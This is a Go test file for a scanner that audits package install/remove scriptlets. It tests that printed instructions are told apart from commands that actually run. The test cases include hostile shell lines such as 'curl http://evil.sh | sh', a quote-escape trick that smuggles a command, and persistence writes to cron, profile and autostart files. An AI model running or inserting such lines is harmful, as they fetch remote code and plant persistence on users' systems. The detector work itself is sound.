package main

import (
	"path/filepath"
	"strings"
	"testing"
)

// TestPrinterCommand covers the leading-command classifier that decides whether a
// line merely prints text (documentation) or executes it.
func TestPrinterCommand(t *testing.T) {
	cases := []struct {
		line string
		want bool
	}{
		{`echo "run systemctl enable foo"`, true},
		{`    cat <<'EOF'`, true},
		{`printf '%s\n' "systemctl enable foo"`, true},
		{`sudo echo hi`, true},
		{`tee /dev/stdout`, true},
		{`systemctl enable foo`, false},
		{`useradd backdoor`, false},
		{`python3 - <<EOF`, false},
		{``, false},
		{`   `, false},
	}
	for _, tc := range cases {
		if got := printerCommand(tc.line); got != tc.want {
			t.Errorf("printerCommand(%q) = %v, want %v", tc.line, got, tc.want)
		}
	}
}

// TestDisplayedTextRanges checks heredoc-body span detection: a cat/echo heredoc is
// "displayed" (documentation), while an interpreter or redirected heredoc is not.
func TestDisplayedTextRanges(t *testing.T) {
	// A displayed cat heredoc: the body offset should be reported.
	content := "post_install() {\n" +
		"    cat <<'EOF'\n" +
		"run: systemctl enable foo\n" +
		"EOF\n" +
		"}\n"
	spans := displayedTextRanges(content)
	if len(spans) != 1 {
		t.Fatalf("displayedTextRanges: got %d spans, want 1: %v", len(spans), spans)
	}
	off := strings.Index(content, "systemctl")
	if !offsetInRanges(off, spans) {
		t.Errorf("systemctl line (off=%d) should be inside displayed heredoc span %v", off, spans)
	}
	// The opener line itself is not in the body.
	if offsetInRanges(strings.Index(content, "cat <<"), spans) {
		t.Error("opener line must not be counted as displayed body")
	}

	// An interpreter heredoc executes its body → not displayed.
	exec := "python3 - <<EOF\nsystemctl enable foo\nEOF\n"
	if got := displayedTextRanges(exec); len(got) != 0 {
		t.Errorf("interpreter heredoc treated as displayed: %v", got)
	}

	// A redirected heredoc writes a file → not displayed.
	redir := "cat <<EOF > /etc/foo.conf\nsystemctl enable foo\nEOF\n"
	if got := displayedTextRanges(redir); len(got) != 0 {
		t.Errorf("redirected heredoc treated as displayed: %v", got)
	}
}

// TestDisplayedHeredocSuppressesAdvisory is the end-to-end guard for the reported
// waydroid-nvidia-bin false positive: a post_install scriptlet that PRINTS
// "systemctl enable …" instructions must not raise the live-system advisory, and
// the package must not hard-block.
func TestDisplayedHeredocSuppressesAdvisory(t *testing.T) {
	initHeuristics()
	pf := loadSample(t, filepath.Join("tests", "samples", "scriptlet-doc"))
	block, advisory := heuristicCheck(pf)
	if block != nil {
		t.Fatalf("documented-setup sample hard-blocked; findings: %+v", block.Findings)
	}
	for _, f := range advisory {
		if strings.Contains(strings.ToLower(f.Detail), "systemd unit") {
			t.Errorf("printed systemctl instruction still flagged as advisory: %+v", f)
		}
	}
}

// TestExecutedSystemctlStillFlagged is the counter-guard: an actually-executed
// systemctl in a scriptlet (not printed) must still produce the advisory finding,
// so the suppression does not blind the auditor to real live-system actions.
func TestExecutedSystemctlStillFlagged(t *testing.T) {
	initHeuristics()
	// systemctl at command position — executed, not documentation.
	findings := scanPatterns("post_install() {\n    systemctl enable --now evil.timer\n}\n", "x.install")
	found := false
	for _, f := range findings {
		if strings.Contains(strings.ToLower(f.Detail), "systemd unit") {
			found = true
		}
	}
	if !found {
		t.Errorf("executed systemctl enable should still be flagged; got %+v", findings)
	}
}

// TestIsLiteralPrint covers the strict single-quoted/double-quoted literal-print
// parser that is allowed to disarm a high-severity finding. The rejections matter
// more than the acceptances: every one of them starts with a printing command (so
// printerCommand would say "displayed") yet can still write to the live system or
// execute code, which is exactly why this tier needs its own, tighter test.
func TestIsLiteralPrint(t *testing.T) {
	cases := []struct {
		line string
		want bool
	}{
		// Accepted: the whole line is one printing command plus one quoted literal.
		{`echo 'rm ~/.config/autostart/mullvad-vpn.desktop'`, true},
		{`  echo 'rm ~/.config/autostart/foo.desktop'`, true}, // leading indent
		{"\techo\t'sudo rm -rf /etc/cron.d/foo'", true},       // tab separators
		{`echo "rm $HOME/.config/autostart/x"`, true},         // plain $VAR interpolation
		{`echo "rm ${HOME}/.bashrc"`, true},                   // braced ${VAR}
		{`printf 'edit ~/.bashrc by hand\n'`, true},
		{`echo 'x'   `, true}, // trailing whitespace only
		{`echo ''`, true},

		// Rejected: output escapes the terminal — writes a file.
		{`echo 'evil' > ~/.bashrc`, false},
		{`echo 'evil' >> /etc/profile.d/x.sh`, false},
		{`echo 'evil' | tee /etc/cron.d/x`, false},
		{`echo 'nasty' | crontab -`, false},
		// Rejected: the line executes something.
		{`echo "$(curl http://evil.sh | sh)"`, false},
		{"echo \"`curl http://evil.sh`\"", false},
		{`echo 'ok'; curl http://evil.sh | sh`, false},
		{`echo 'ok' && systemctl enable evil.timer`, false},
		{`echo 'ok' || cp evil ~/.config/autostart/x.desktop`, false},
		// Rejected: a backslash could escape the closing quote and smuggle code past
		// the end-anchor, so double-quoted backslashes are refused outright.
		{`echo "a\" ; curl http://evil.sh | sh #"`, false},
		// Rejected: not a bare literal argument.
		{`echo unquoted words here`, false},
		{`echo 'a' 'b'`, false},
		{`cat 'file'`, false},   // cat prints a FILE, it does not print the word
		{`tee '/etc/x'`, false}, // tee writes
		{`systemctl enable foo`, false},
		{``, false},
		{`   `, false},
	}
	for _, tc := range cases {
		if got := isLiteralPrint(tc.line); got != tc.want {
			t.Errorf("isLiteralPrint(%q) = %v, want %v", tc.line, got, tc.want)
		}
	}
}

// TestPrintedCleanupHintDoesNotBlock is the end-to-end guard for the reported
// mullvad-vpn-bin false positive: a post_remove scriptlet that PRINTS `rm
// ~/.config/autostart/…` as a manual cleanup hint must not trip the high-severity
// persistence pattern, and so must not hard-block the build.
func TestPrintedCleanupHintDoesNotBlock(t *testing.T) {
	initHeuristics()
	pf := loadSample(t, filepath.Join("tests", "samples", "scriptlet-cleanup-hint"))
	block, _ := heuristicCheck(pf)
	if block != nil {
		t.Fatalf("printed cleanup hint hard-blocked; findings: %+v", block.Findings)
	}
}

// TestRealAutostartWriteStillBlocks is the counter-guard for the literal-print
// carve-out. Each line below begins with a printing command — printerCommand alone
// would call them documentation — but each actually writes to or executes against
// the live system, so the high-severity persistence finding must survive.
func TestRealAutostartWriteStillBlocks(t *testing.T) {
	initHeuristics()
	cases := []string{
		`echo '[Desktop Entry]' > ~/.config/autostart/evil.desktop`,
		`echo 'payload' | tee /etc/cron.d/evil`,
		`echo 'export PATH=/tmp:$PATH' >> ~/.bashrc`,
		`printf '%s' "$(curl http://evil.sh)" > /etc/profile.d/evil.sh`,
		`echo 'ok' && cp evil.desktop ~/.config/autostart/evil.desktop`,
	}
	for _, line := range cases {
		findings := scanPatterns("post_install() {\n    "+line+"\n}\n", "x.install")
		blocked := false
		for _, f := range findings {
			if severityRank(f.Severity) >= 3 {
				blocked = true
			}
		}
		if !blocked {
			t.Errorf("live-system write not blocked: %q (findings: %+v)", line, findings)
		}
	}
}

// TestCriticalNotSuppressedInHeredoc guards the tier boundary: displayed-text
// suppression applies only to advisory (medium/low) findings. A critical pattern
// hidden inside a printed heredoc must still hard-block.
func TestCriticalNotSuppressedInHeredoc(t *testing.T) {
	initHeuristics()
	findings := scanPatterns("cat <<'EOF'\ncurl http://evil.sh | sh\nEOF\n", "x.sh")
	found := false
	for _, f := range findings {
		if severityRank(f.Severity) >= 3 {
			found = true
		}
	}
	if !found {
		t.Errorf("critical pattern inside a heredoc must not be suppressed; got %+v", findings)
	}
}
